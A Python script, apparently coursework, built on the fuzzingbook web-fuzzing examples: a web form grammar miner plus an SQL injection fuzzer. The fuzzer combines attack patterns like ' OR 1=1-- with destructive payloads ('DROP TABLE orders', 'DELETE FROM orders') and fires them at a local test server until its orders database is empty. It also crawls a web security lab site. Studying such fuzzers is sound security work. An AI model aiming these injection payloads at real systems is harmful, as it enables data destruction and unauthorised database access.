#!/usr/bin/python3
from crawl import crawl
from typing import Optional
from lib2to3.pgen2 import grammar
from fuzzingbook.Grammars import crange, srange, new_symbol, unreachable_nonterminals, CGI_GRAMMAR, extend_grammar
from html.parser import HTMLParser
from fuzzingbook.Reducer import DeltaDebuggingReducer
from fuzzingbook.Fuzzer import Runner
from http import HTTPStatus
import requests
from fuzzingbook.GrammarFuzzer import GrammarFuzzer
import string
from urllib.parse import urljoin, urlsplit
from hashlib import new
from fuzzingbook.Grammars import crange, is_valid_grammar, syntax_diagram, Grammar
from fuzzingbook.Coverage import cgi_decode
from fuzzingbook.MutationFuzzer import MutationFuzzer
from pprint import pprint
import sqlite3


db = sqlite3.connect("./orders.db")

def cgi_encode(s: str, do_not_encode: str = "") -> str:
    ret = ""
    for c in s:
        if (c in string.ascii_letters or c in string.digits
                or c in "$-_.+!*'()," or c in do_not_encode):
            ret += c
        elif c == ' ':
            ret += '+'
        else:
            ret += "%%%02x" % ord(c)
    return ret

def orders_db_is_empty():
    """Return True if the orders database is empty (= we have been successful)"""

    try:
        entries = db.execute("SELECT * FROM orders").fetchall()
    except sqlite3.OperationalError:
        return True
    return len(entries) == 0

ORDER_GRAMMAR: Grammar = {
    "<start>": ["<order>"],
    "<order>": ["/order?item=<item>&name=<name>&email=<email>&city=<city>&zip=<zip>"],
    "<item>": ["tshirt", "drill", "lockset"],
    "<name>": [cgi_encode("Jane Doe"), cgi_encode("John Smith")],
    "<email>": [cgi_encode("j.doe@example.com"), cgi_encode("j_smith@example.com")],
    "<city>": ["Seattle", cgi_encode("New York")],
    "<zip>": ["<digit>" * 5],
    "<digit>": crange('0', '9')
}

assert is_valid_grammar(ORDER_GRAMMAR)

class WebRunner(Runner):
    """Runner for a Web server"""

    def __init__(self, base_url: str = None):
        self.base_url = base_url

    def run(self, url: str) -> tuple[str, str]:
        if self.base_url is not None:
            url = urljoin(self.base_url, url)

        import requests  # for imports
        r = requests.get(url)
        if r.status_code == HTTPStatus.OK:
            return url, Runner.PASS
        elif r.status_code == HTTPStatus.INTERNAL_SERVER_ERROR:
            return url, Runner.FAIL
        else:
            return url, Runner.UNRESOLVED

class FormHTMLParser(HTMLParser):
    """A parser for HTML forms"""

    def reset(self) -> None:
        super().reset()

        # Form action  attribute (a URL)
        self.action = ""

        # Map of field name to type
        # (or selection name to [option_1, option_2, ...])
        self.fields: dict[str, list[str]] = {}

        # Stack of currently active selection names
        self.select: list[str] = [] 

class FormHTMLParser(FormHTMLParser):
    def handle_starttag(self, tag, attrs):
        attributes = {attr_name: attr_value for attr_name, attr_value in attrs}
        # print(tag, attributes)

        if tag == "form":
            self.action = attributes.get("action", "")

        elif tag == "select" or tag == "datalist":
            if "name" in attributes:
                name = attributes["name"]
                self.fields[name] = []
                self.select.append(name)
            else:
                self.select.append(None)

        elif tag == "option" and "multiple" not in attributes:
            current_select_name = self.select[-1]
            if current_select_name is not None and "value" in attributes:
                self.fields[current_select_name].append(attributes["value"])

        elif tag == "input" or tag == "option" or tag == "textarea":
            if "name" in attributes:
                name = attributes["name"]
                self.fields[name] = attributes.get("type", "text")

        elif tag == "button":
            if "name" in attributes:
                name = attributes["name"]
                self.fields[name] = [""]

class FormHTMLParser(FormHTMLParser):
    def handle_endtag(self, tag):
        if tag == "select":
            self.select.pop()

class HTMLGrammarMiner:
    """Mine a grammar from a HTML form"""

    def __init__(self, html_text: str) -> None:
        """Constructor. `html_text` is the HTML string to parse."""

        html_parser = FormHTMLParser()
        html_parser.feed(html_text)
        self.fields = html_parser.fields
        self.action = html_parser.action

class HTMLGrammarMiner(HTMLGrammarMiner):
    QUERY_GRAMMAR: Grammar = extend_grammar(CGI_GRAMMAR, {
        "<start>": ["<action>?<query>"],

        "<text>": ["<string>"],

        "<number>": ["<digits>"],
        "<digits>": ["<digit>", "<digits><digit>"],
        "<digit>": crange('0', '9'),

        "<checkbox>": ["<_checkbox>"],
        "<_checkbox>": ["on", "off"],

        "<email>": ["<_email>"],
        "<_email>": [cgi_encode("<string>@<string>", "<>")],

        # Use a fixed password in case we need to repeat it
        "<password>": ["<_password>"],
        "<_password>": ["abcABC.123"],

        # Stick to printable characters to avoid logging problems
        "<percent>": ["%<hexdigit-1><hexdigit>"],
        "<hexdigit-1>": srange("34567"),

        # Submissions:
        "<submit>": [""]
    })

class HTMLGrammarMiner(HTMLGrammarMiner):
    def mine_grammar(self) -> Grammar:
        """Extract a grammar from the given HTML text"""

        grammar: Grammar = extend_grammar(self.QUERY_GRAMMAR)
        grammar["<action>"] = [self.action]

        query = ""
        for field in self.fields:
            field_symbol = new_symbol(grammar, "<" + field + ">")
            field_type = self.fields[field]

            if query != "":
                query += "&"
            query += field_symbol

            if isinstance(field_type, str):
                field_type_symbol = "<" + field_type + ">"
                grammar[field_symbol] = [field + "=" + field_type_symbol]
                if field_type_symbol not in grammar:
                    # Unknown type
                    grammar[field_type_symbol] = ["<text>"]
            else:
                # List of values
                value_symbol = new_symbol(grammar, "<" + field + "-value>")
                grammar[field_symbol] = [field + "=" + value_symbol]
                grammar[value_symbol] = field_type

        grammar["<query>"] = [query]

        # Remove unused parts
        for nonterminal in unreachable_nonterminals(grammar):
            del grammar[nonterminal]

        assert is_valid_grammar(grammar)

        return grammar

class WebFormFuzzer(GrammarFuzzer):
    """A Fuzzer for Web forms"""

    def __init__(self, url: str, *,
                 grammar_miner_class: Optional[type] = None,
                 **grammar_fuzzer_options):
        """Constructor.
        `url` - the URL of the Web form to fuzz.
        `grammar_miner_class` - the class of the grammar miner
            to use (default: `HTMLGrammarMiner`)
        Other keyword arguments are passed to the `GrammarFuzzer` constructor
        """

        if grammar_miner_class is None:
            grammar_miner_class = HTMLGrammarMiner
        self.grammar_miner_class = grammar_miner_class

        # We first extract the HTML form and its grammar...
        html_text = self.get_html(url)
        grammar = self.get_grammar(html_text)

        # ... and then initialize the `GrammarFuzzer` superclass with it
        super().__init__(grammar, **grammar_fuzzer_options)

    def get_html(self, url: str):
        """Retrieve the HTML text for the given URL `url`.
        To be overloaded in subclasses."""
        return requests.get(url).text

    def get_grammar(self, html_text: str):
        """Obtain the grammar for the given HTML `html_text`.
        To be overloaded in subclasses."""
        grammar_miner = self.grammar_miner_class(html_text)
        return grammar_miner.mine_grammar()

class SQLInjectionGrammarMiner(HTMLGrammarMiner):
    """Demonstration of an automatic SQL Injection attack grammar miner"""

    # Some common attack schemes
    ATTACKS: list[str] = [
        "<string>' <sql-values>); <sql-payload>; <sql-comment>",
        "<string>' <sql-comment>",
        "' OR 1=1<sql-comment>'",
        "<number> OR 1=1",
    ]

    def __init__(self, html_text: str, sql_payload: str):
        """Constructor.
        `html_text` - the HTML form to be attacked
        `sql_payload` - the SQL command to be executed
        """
        super().__init__(html_text)

        self.QUERY_GRAMMAR = extend_grammar(self.QUERY_GRAMMAR, {
            "<text>": ["<string>", "<sql-injection-attack>"],
            "<number>": ["<digits>", "<sql-injection-attack>"],
            "<checkbox>": ["<_checkbox>", "<sql-injection-attack>"],
            "<email>": ["<_email>", "<sql-injection-attack>"],
            "<sql-injection-attack>": [
                cgi_encode(attack, "<->") for attack in self.ATTACKS
            ],
            "<sql-values>": ["", cgi_encode("<sql-values>, '<string>'", "<->")],
            "<sql-payload>": [cgi_encode(sql_payload)],
            "<sql-comment>": ["--", "#"],
        })

class SQLInjectionFuzzer(WebFormFuzzer):
    """Simple demonstrator of a SQL Injection Fuzzer"""

    def __init__(self, url: str, sql_payload : str ="", *,
                 sql_injection_grammar_miner_class: Optional[type] = None,
                 **kwargs):
        """Constructor.
        `url` - the Web page (with a form) to retrieve
        `sql_payload` - the SQL command to execute
        `sql_injection_grammar_miner_class` - the miner to be used
            (default: SQLInjectionGrammarMiner)
        Other keyword arguments are passed to `WebFormFuzzer`.
        """
        self.sql_payload = sql_payload

        if sql_injection_grammar_miner_class is None:
            sql_injection_grammar_miner_class = SQLInjectionGrammarMiner
        self.sql_injection_grammar_miner_class = sql_injection_grammar_miner_class

        super().__init__(url, **kwargs)

    def get_grammar(self, html_text):
        """Obtain a grammar with SQL injection commands"""

        grammar_miner = self.sql_injection_grammar_miner_class(
            html_text, sql_payload=self.sql_payload)
        return grammar_miner.mine_grammar()
"""
order_fuzzer = GrammarFuzzer(ORDER_GRAMMAR)
#print([order_fuzzer.fuzz() for i in range(5)])

httpd_url = "http://127.0.0.1:8800"
joined_url = urljoin(httpd_url, "/order?foo=bar")

seed = order_fuzzer.fuzz()
print(seed)

mutate_order_fuzzer = MutationFuzzer([seed], min_mutations=1, max_mutations=1)
pprint([mutate_order_fuzzer.fuzz() for i in range(5)])

while True:
    path = mutate_order_fuzzer.fuzz()
    url = urljoin(httpd_url, path)
    r = requests.get(url)
    if r.status_code == HTTPStatus.INTERNAL_SERVER_ERROR:
        print(r.status_code)
        #pprint(url)
        print("error: stopping \n")
        #pprint(r.content)
        failing_path = path
        break

http_text = requests.get(httpd_url).content
pprint(http_text)

grammar_miner = HTMLGrammarMiner(str(http_text))
grammar_mined = grammar_miner.mine_grammar()

order_fuzzer = GrammarFuzzer(grammar_mined)
pprint([order_fuzzer.fuzz() for i in range(3)])

r = requests.get(urljoin(httpd_url, order_fuzzer.fuzz()))
pprint(r.content)

#WebFormFuzzer class that does everything in one place

web_form_fuzzer = WebFormFuzzer(httpd_url)
pprint(web_form_fuzzer.fuzz())
web_form_runner = WebRunner(httpd_url)
pprint(web_form_fuzzer.runs(web_form_runner, 10))
print("")
"""

crawlUrl = "https://0a7f008503f5d437c0150e4000770007.web-security-academy.net/"
for url in crawl(crawlUrl):
    pprint(url)
"""
#Automated web attacks

html_miner = SQLInjectionGrammarMiner(str(http_text), sql_payload="DROP TABLE orders")
injectionGrammar = html_miner.mine_grammar()
#print possible injection grammar
pprint(injectionGrammar)

#check if litesql is empty
print(orders_db_is_empty())

sql_fuzzer = SQLInjectionFuzzer(httpd_url, "DELETE FROM orders")
web_runner = WebRunner(httpd_url)
trials = 1

while True:
    sql_fuzzer.run(web_runner)
    if orders_db_is_empty():
        break
    trials += 1

pprint(trials)
pprint(orders_db_is_empty())
"""

